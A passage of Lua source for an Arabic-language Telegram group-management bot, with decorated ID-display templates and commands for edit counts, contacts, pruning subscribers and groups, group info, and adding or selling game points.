➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast .♡ 
➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit .♡
➼ : 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
▽ ¦❀• USER ➭ ⁞ #username .
▽ ¦❀• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs  .
▽ ¦❀• STAT ➬ ⁞ #stast  .
▽ ¦❀• 𝙸𝙳  ➬ ⁞ #id  .
▽ ¦❀• 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
• ❉ 𝑼𝑬𝑺 : #username ‌‌‏.
• ❉ 𝑺𝑻𝑨 : #stast .
• ❉ 𝑰𝑫 : #id  ‌‌‏.
• ❉  𝑴𝑺𝑮 : #msgs 𓆊.
• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞ .
• ❉ 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
|USERNAME #username 𓃚
| YOUR -ID - #id 𓃚
| STAS-#stast 𓃚
 | MSAG - #msgs ??
 | 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
𝟔𝟔𝟔 𖡋 #username • 𖣰💞
𝟔𝟔𝟔 𖡋  #stast •𖣰💞
𝟔??𝟔 𖡋 #id • 𖣰💞
𝟔𝟔𝟔 𖡋 #game • 𖣰💞
𝟔𝟔𝟔 𖡋 #msgs • 𖣰💞
𝟔𝟔𝟔 𖡋 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
⌔➺: Msgs : #msgs - 🔹.
⌔➺: ID : #id - 🔹.
⌔➺: Stast : #stast -🔹.
⌔➺: UserName : #username -🔹.
⌔➺: 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
 𖥔 - 𝓾𝓼𝓮𝓻 ➪ #username 𖥔.
 𖥔 - 𝓼𝓽𝓪𝓼𝓽  ➪ #stast 𖥔.
 𖥔 - 𝓲𝓭 ➪ #id ⸙ 𖥔.
 𖥔 - 𝓰𝓶𝓪𝓼 ➪ #gmas ⸙ 𖥔.
 𖥔 - 𝓶𝓼𝓰𝓼 ➪ #msgs 𖥔.
 𖥔 - 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
◣: 𝒔𝒕𝒂𓂅 #stast 𓍯➥♡.
◣: 𝐮𝐬𝐞𝐫𓂅 #username 𓍯➥♡.
◣: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➥♡.
◣: 𝐢𝐝 𓂅 #id 𓍯➥♡.
◣: 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
- 𝄬 username . #username ➪🇪🇬
 - 𝄬 stast . #stast ➪🇪🇬
 - 𝄬 id . #id ➪🇪🇬
 - 𝄬 msgs . #msgs ➪🇪🇬
 - 𝄬 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
↣• USE ➤ #username  ↝🍬.
↣• MSG ➤  #msgs  ↝🍬.
↣• STA ➤  #stast  ↝🍬.
↣• iD ➤ #id  ↝🍬.
↣• 𝗖𝗛 - 「@SOURCEVENOM」 🍬
]],
[[
➫✿: S #stast 𓍯➟♡.
➫✿: U𓂅 #username 𓍯➟♡.
➫✿: M𓂅 #msgs 𓍯➟♡.
➫✿:  I  #id ➟♡.
➫✿: 𝗖?? - 「@SOURCEVENOM」 ♡.
]],
[[
✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃ .
✶- 𝐮𝐬𝐞𝐫𓂅 #username 𓍯↝❃.
✶- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯↝❃.
✶- 𝐢𝐝 𓂅 #id 𓍯↝❃.
✶- 𝗖𝗛 - 「@SOURCEVENOM」 ↝❃.
]],
[[
• 🖤 | 𝑼𝑬𝑺 :  #username

• 🖤 | 𝑺𝑻𝑨 : #stast

• 🖤 | 𝑰𝑫 :  #id

• 🖤 | 𝑴𝑺𝑮 : #msgs

• 🖤 | 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
• USE 𖦹 #username 
• MSG 𖥳 #msgs  
• STA 𖦹 #stast 
• iD 𖥳 #id
• 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
🌨↓Use ⇨ #username 🌨
🌨↓iD ⇨ #id 🌨
🌨↓Sta ⇨  #stast 🌨
🌨↓Msg ⇨ #msgs 🌨
🌨↓NaMe ⇨ #name  🌨
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
- ѕᴛᴀᴛѕ ➣ #stast .
- ʏᴏᴜʀ ɪᴅ ➣ #id  .
- ᴇᴅɪᴛ ᴍsɢ ➣ #edit .
- ᴅᴇᴛᴀɪʟs ➣ #auto . 
-  ɢᴀᴍᴇ ➣ #game .
- 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
⚕𝙐𝙎𝙀𝙍??𝘼𝙈𝙀 : #username
⚕𝙈𝙀𝙎𝙎??𝙂𝙀𝙎 : #msgs
⚕𝙎𝙏𝘼𝙏𝙎 : #stast
⚕𝙄𝘿 : #id
⚕??𝙀𝙒𝙀𝙇𝙎 : #game
⚕𝘿𝙀𝙑 : #ridha
⚕𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
• 🦄 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🦄 | 𝑺𝑻𝑨 : #stast ☥
• 🦄 | 𝑰𝑫 : #id ‌‌‏♕
• 🦄 | 𝑴𝑺𝑮 : #msgs 𓆊
• 🦄 | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 : ⁞
• 🦄 | 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
• △ | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• ▽ | 𝑺𝑻𝑨 : #stast ☥
• ⊠ | 𝑰𝑫 : #id ‌‌‏♕
• ❏ | 𝑴𝑺𝑮 : #msgs 𓆊
• ❏ | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 :
• ❏ | 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
┇iD ➺ #id 💘
┇UsEr ➺ #username 💕
┇MsG ➺ #msgs 🧸 
┇StAtE ➺ #stast 🎀
┇EdIT ➺ #edit  💒
┇𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂ ☥
• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
• 🖤 | 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
𓄼 ᴜѕᴇ : #username ♕
𓄼 ѕᴛᴀ : #stast ☥
𓄼 ɪᴅ : #id ‌‌‏⚚
𓄼 ᴍѕɢ : #msgs 𓆊
𓄼 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
‎⿻┊Yor iD 𖠄 #id ٫
‌‎⿻┊UsEr 𖠄 #username ٫
‌‎⿻┊MsGs 𖠄 #msgs ٫
‌‎⿻┊StAtS 𖠄 #stast ٫
‌‎⿻┊‌‎EdiT 𖠄 #edit ٫
‌‎⿻┊‌‎𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
• ﮼ايديك  #id 🌻 ٬
• ﮼يوزرك ➺ #username 🌻 ٬
• ﮼مسجاتك ➺ #msgs 🌻 ٬
•  ﮼رتبتك➺ #stast 🌻 ٬
• ﮼تعديلك ➺ #edit 🌻 ٬
•  تعين ➺ 「@SOURCEVENOM」 𖥔
]],
[[
┄─━━ 𖥔━━─┄
𖣤 ᴜѕᴇʀɴᴀᴍᴇ 𓄹?? #id 🇪🇬
𖦼 ʏᴏᴜʀ ɪᴅ 𓄹𓄼 #username  💛
𖥪 ᴍѕɢѕ 𓄹𓄼 #msgs ✉️
𖥧 ѕᴛᴀᴛѕ 𓄹𓄼 #stast 👩🏿‍🚒 
𖥣 ᴇᴅɪᴛ 𓄹𓄼 #game🙇🏿‍♀💕
✰ ᴄʜ ᴇʟɪɴ ➣ #edit
┄─━━ 𖥔━━─┄
✰ 𝗖?? - 「@SOURCEVENOM」 𖥔
]],
[[
⌾ | 𝐢𝐝  𓃠 #id .
⌾ | 𝐮𝐬𝐞𝐫 𓃠 #username .
⌾ | 𝐦𝐬𝐠 𓃠 #msgs .
⌾ | 𝐬𝐭𝐚 𓃠 #stast .
⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit .
⌾ | 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
♡ : 𝐼𝐷 𖠀 #id .
♡ : 𝑈𝑆??𝑅 𖠀 #username .
♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .
♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast .
♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit .
♡ : 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
•ᑌᔕᗴᖇ- #username 
•ᔕTᗩ- #stast 
•ᗰᔕ- #msgs 
•Iᗪ- #id
•𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
• USE ➤ #username  .
• MSG ➤  #msgs  .
• STA ➤  #stast  .
• iD ➤ #id  .
• 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
𝐘??𝐮𝐫 𝐈𝐃 ☤🇪🇬- #id 
𝐔𝐬𝐞𝐫𝐍𝐚☤🇪🇬- #username 
𝐒𝐭𝐚𝐬𝐓 ☤🇪🇬- #stast 
𝐌𝐬𝐠𝐒☤🇪🇬 - #msgs
𝗖𝗛☤🇪🇬 - 「@SOURCEVENOM」 𖥔
]],
[[
⭐️𝖘𝖙𝖆 : #stast ـ🍭
⭐️𝖚𝖘𝖊𝖗𝖓𝖆𝖒𝖊 : #username ـ🍭
⭐️𝖒𝖘𝖌?? : #msgs ـ🍭
⭐️𝖎𝖉 : #id ـ 🍭
⭐️𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
• 🇪🇬 - 𝚄𝚂𝙴𝚁 « #username  🍭
• 🇪🇬 - 𝙸𝙳 « #id  🍭
• 🇪🇬 - 𝙼𝚂𝙶𝚂 « #msgs  🍭
• 🇪🇬 - 𝚂𝚃𝙰𝚂𝚃 « #stast  🍭
• 🇪🇬 - 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
• USE ➤  #username .
• MSG ➤  #msgs .
• STA ➤  #stast .
• iD ➤ #id .
• 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
??🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  𓃠
🇪🇬 - 𝄬 ˢᵀᴬˢᵀ . #stast  𓃠
🇪🇬 - 𝄬 ᴵᴰ . #id 𓃠
🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas 𓃠
🇪🇬 - 𝄬 ᴹˢᴳˢ . #msgs  𓃠
🇪🇬 - 𝄬 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
➜𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : #username
➜𝗠𝗘𝗦𝗦??𝗚𝗘𝗦 : #msgs
➜𝗦𝗧𝗔𝗧𝗦 : #stast
➜𝗜𝗗 : #id
➜𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
- 🇪🇬 UsErNaMe . #username 𖠲
- 🇪?? StAsT . #stast 𖠲
- 🇪🇬 Id . #id 𖠲
- 🇪🇬 GaMeS . #game 𖠲
- 🇪🇬 MsGs . #msgs 𖠲
- 🇪🇬 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
⌔┇Msgs : #msgs.
⌔┇ID : #id.
⌔┇Stast : #stast.
⌔┇UserName : #username.
⌔┇𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
𝒔𝒕𝒂?? #stast 𓍯
𝐮𝐬𝐞𝐫𓂅 #username 𓍯
𝒎????𝒆𓂅 #msgs 𓍯
𝐢𝐝 𓂅 #id 𓍯
𓂅 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
𓄼🇪🇬 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username ♕
𓄼🇪🇬 𝑺𝒕𝒂𝒔𝒕 : #stast    ☥
𓄼🇪🇬 𝐢𝐝 : #id ‌‌‏⚚
𓄼🇪🇬 𝑮𝒂𝒎𝒆𝑺 : #edit ⚚
𓄼🇪🇬 𝑴𝒔𝒈𝒔 : #msgs 𓆊
𓄼🇪🇬 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
Usᴇʀ Nᴀᴍᴇ ~ #username 
Yᴏᴜʀ ɪᴅ ~ #id 
Sᴛᴀsᴛ ~ #stast 
Msᴀɢ ~ #msgs
𝗖?? - 「@SOURCEVENOM」 𖥔
]],
[[
➥• USE 𖦹 #username - 🇪??.
➥• MSG 𖥳 #msgs  - 🇪🇬.
➥• STA 𖦹 #stast - 🇪??.
➥• iD 𖥳 #id - 🇪🇬.
➥• 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
🇪🇬 - 𝄬 username . #username  ??
🇪🇬 - 𝄬 stast . #stast  𓃠
🇪🇬 - 𝄬 id . #id 𓃠
🇪🇬 - 𝄬 gmas . #gmas 𓃠
🇪🇬 - 𝄬 msgs . #msgs  𓃠
🇪🇬 - 𝄬 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  🖤 ↴
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  🖤 ↴
.𖣂 𝙡𝘿 , #id  🖤 ↴
.𖣂 𝘼𝙪𝙩𝙤 , #auto  🖤 ↴
.𖣂 𝙢𝙨𝙂𝙨 , #msgs  🖤 ↴
.𖣂 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
金 - 𝓾𝓼𝓮𝓻??𝓪𝓶𝓮 . #username ⸙ 
金 - 𝓼𝓽𝓪𝓼𝓽  . #stast ⸙ 
金 - 𝓲𝓭 . #id ⸙ 
金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
金 - 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
- 🇪🇬 𝐮𝐬𝐞𝐫𝒏𝒂𝒎𝒆 . #username 𖣂.
- 🇪🇬 𝒔𝒕𝒂𝒔𝒕 . #stast 𖣂.
- 🇪🇬 𝐢𝐝 . #id 𖣂.
- 🇪🇬 𝒈𝒂𝒎𝒆𝒔 . #game 𖣂.
- 🇪🇬 𝐦𝐬𝐠 . #msgs 𖣂.
- 🇪🇬 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇪🇬 ꙰
ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇪🇬 ꙰
ᯓ 𝗜𝗗 . #id 🇪🇬 ꙰
ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇪🇬 ꙰
ᯓ 𝗺𝗦𝗚𝗦 . #msgs ??🇬 ꙰
ᯓ 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
👳🏼‍♂ - 𝄬 username . #username . 🇪🇬
👳🏼‍♂ - 𝄬 stast . #stast . 🇪🇬
👳🏼‍♂ - 𝄬 id . #id . 🇪🇬
👳🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
👳🏼‍♂ - 𝄬 msgs . #msgs . 🇪🇬
👳🏼‍♂ - 𝄬 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
➮- 𝐮𝐬𝐞𝐫𓂅 #username 𓍯. 💕
➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
➭- 𝐢𝐝 𓂅 #id 𓍯. 💕
➭- 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
𓄼 ᴜѕᴇ : #username ♕
𓄼 ѕᴛᴀ : #stast  ☥
𓄼 ɪᴅ : #id ‌‌‏⚚
𓄼 ᴍѕɢ : #msgs 𓆊 
𓐀 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𓀃.
𓄼 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id .
𝐓𝐓• 𝐌𝐬𝐠𝐒 𖠰 #msgs .
𝐓𝐓• 𝐔𝐬𝐞𝐫𝐍𝐚 𖠰 #username .
𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast .
𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto .
𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit .
𝐓𝐓• 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
↑↓𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username 𖥔  
↑↓𝙄𝘿 ➱ #id
↑↓𝙍𝘼𝙉𝙆 ➱  #stast 𖥔  
↑↓𝙈𝘼𝙎𝙂 ➱ #msgs 𖥔  
↑↓𝗖𝗛 ➯  「@SOURCEVENOM」 𖥔  
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
𝟓 𝟔 𖡻 #msgs  ࿇🦄
𝟓 𝟔 𖡻 #auto  ࿇🦄
𝟓 𝟔 𖡻 #stast  ࿇🦄
𝟓 𝟔 𖡻 #id  ࿇🦄
𝟓 𝟔 𖡻 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
► 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 #username 𓃚  ꙰
► 𝗜𝗗 #id 𓃚 ꙰
► 𝗦𝗧𝗔𝗦 #stast 𓃚 ꙰
► 𝗠𝗦𝗔𝗚 #msgs 𓃚 ꙰
► 𝗶𝗗 - 「@SOURCEVENOM」 ☆
]],
[[
- UsEr🇺🇸 ꙰ #username
- StA🇺🇸 ꙰   #msgs
- MsGs🇺🇸 ꙰ #stast
- ID🇺🇸 ꙰  #id
- 𝗶𝗗 🇺🇸 ꙰  「@SOURCEVENOM」 ☆
]],
[[
¦• 𝚄𝚂𝙴𝚁  ⇉⁞ #username ↝🇵🇷.
¦• 𝙼𝚂𝙶𝚂 ⇉ ⁞  #msgs  ↝ 🇵🇷.
¦• 𝚁𝙰𝙽𝙺  ⇉⁞ #stast  ↝🇵🇷.
¦• 𝙸𝙳 𝚂𝚃𝙰 ⇉ #id  ↝🇵🇷.
¦• 𝗶𝗗 - 「@SOURCEVENOM」 ☆
]],
[[
- 🦋 UsErNaMe . #username 𖠲
- 🦋 StAsT . #stast 𖠲
- 🦋 Id . #id 𖠲
- 🦋 GaMeS . #game 𖠲
- 🦋 MsGs . #msgs 𖠲
- 🦋 𝗖𝗛 - 「@SOURCEVENOM」 ☆
]]}
local Text_Rand = List[math.random(#List)]
database:set(bot_id.."KLISH:ID"..msg.chat_id_,Text_Rand)
send(msg.chat_id_, msg.id_,' 𖥔 تم تغير الايدي ارسل ايدي لرؤيته')
end

if text == 'سحكاتي' or text == 'تعديلاتي' then 
local Num = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
if Num == 0 then 
Text = ' 𖥔  ليس لديك سحكات'
else
Text = ' 𖥔 عدد سحكاتك * ↚ 「 '..Num..' 」 *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "مسح سحكاتي" or text == "مسح سحكاتي" then  
send(msg.chat_id_, msg.id_,' 𖥔 تم مسح سحكاتك'  )  
database:del(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_)
end
if text == "مسح جهاتي" or text == "مسح جهاتي" then  
send(msg.chat_id_, msg.id_,' 𖥔 تم مسح جهاتك'  )  
database:del(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_)
end
if text == 'جهاتي' or text == 'شكد ضفت' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local Num = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
if Num == 0 then 
Text = ' 𖥔 لم تقم بأضافه احد'
else
Text = ' 𖥔 عدد جهاتك * ↚ 「 '..Num..' 」 *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "تنظيف المشتركين" and Devban(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'- لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n- اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local pv = database:smembers(bot_id.."User_Bot")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
database:srem(bot_id.."User_Bot",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,' 𖥔  لا يوجد مشتركين وهميين في البوت \n')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,' 𖥔 عدد المشتركين الان  ↚ ( '..#pv..' )\n- تم ازالة  ↚ ( '..sendok..' ) من المشتركين\n- الان عدد المشتركين الحقيقي  ↚ ( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "تنظيف الجروبات" and Devban(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'- لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n- اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local group = database:smembers(bot_id..'Chek:Groups') 
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',group[i])  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=group[i],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,' 𖥔  لا يوجد جروبات وهميه في البوت\n')   
else
local VENOM = (w + q)
local sendok = #group - VENOM
if q == 0 then
VENOM = ''
else
VENOM = '\n- تم ازالة  ↚ 「 '..q..' 」 جروبات من البوت'
end
if w == 0 then
VENOMk = ''
else
VENOMk = '\n- تم ازالة  ↚ 「 '..w..' 」 كروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,' 𖥔 عدد الجروبات الان  ↚ 「 '..#group..' 」'..VENOMk..''..VENOM..'\n*- الان عدد الجروبات الحقيقي  ↚ 「 '..sendok..' 」 جروبات\n')   
end
end
end,nil)
end
return false
end

if text and text:match("^(gpinfo)$") or text and text:match("^معلومات الجروب$") then
function gpinfo(arg,data)
-- vardump(data) 
VENOMdx(msg.chat_id_, msg.id_, ' 𖥔 ايدي المجموعة  ↚ 「 '..msg.chat_id_..' 」\n 𖥔 عدد الادمنيه  ↚ 「 *'..data.administrator_count_..' 」*\n 𖥔 عدد المحظورين  ↚ 「 *'..data.kicked_count_..' 」*\n 𖥔 عدد الاعضاء  ↚ 「 *'..data.member_count_..' 」*\n', 'md') 
end 
getChannelFull(msg.chat_id_, gpinfo, nil) 
end
-----------
if text ==("مسح") and Mod(msg) and tonumber(msg.reply_to_message_id_) > 0 then
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.reply_to_message_id_),msg.id_})   
end   
if database:get(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
database:del(bot_id..'id:user'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, " 𖥔 تم الغاء الامر ") 
database:del(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id..'id:user'..msg.chat_id_)  
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..iduserr,numadded)  
send(msg.chat_id_, msg.id_," 𖥔 تم اضافة له {"..numadded..'} من الرسائل')  
end
------------------------------------------------------------------------
if database:get(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
database:del(bot_id..'idgem:user'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, " 𖥔 تم الغاء الامر ") 
database:del(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id..'idgem:user'..msg.chat_id_)  
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..iduserr,numadded)  
send(msg.chat_id_, msg.id_,  1, " 𖥔| تم اضافة له {"..numadded..'} من النقود', 1 , 'md')  
end
------------------------------------------------------------
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then    
ban = text:match("^اضف رسائل (%d+)$")
database:set(bot_id..'id:user'..msg.chat_id_,ban)  
database:setex(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, ' 𖥔 ارسل لي عدد الرسائل الان') 
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
ban = text:match("^اضف نقاط (%d+)$")
database:set(bot_id..'idgem:user'..msg.chat_id_,ban)  
database:setex(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, ' 𖥔 ارسل لي عدد النقاط التي تريد اضافتها') 
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف نقاط (%d+)$")
function reply(extra, result, success)
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..result.sender_user_id_,Num)  
send(msg.chat_id_, msg.id_," 𖥔 تم اضافة له {"..Num..'} من النقاط')  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف رسائل (%d+)$")
function reply(extra, result, success)
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_) 
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_,Num)  
send(msg.chat_id_, msg.id_, "\n 𖥔 تم اضافة له {"..Num..'} من الرسائل')  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
if text == 'نقاط' or text == 'نقاطي' then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local Num = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0
if Num == 0 then 
Text = ' 𖥔 لم تلعب اي لعبه للحصول على نقاط'
else
Text = ' 𖥔 عدد نقاطك التي ربحتها هيه * ↚ 「 '..Num..' 」 نقاط *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match("^بيع نقاطي (%d+)$") or text and text:match("^بيع نقاط (%d+)$") then
local NUMPY = text:match("^بيع نقاطي (%d+)$") or text and text:match("^بيع نقاط (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
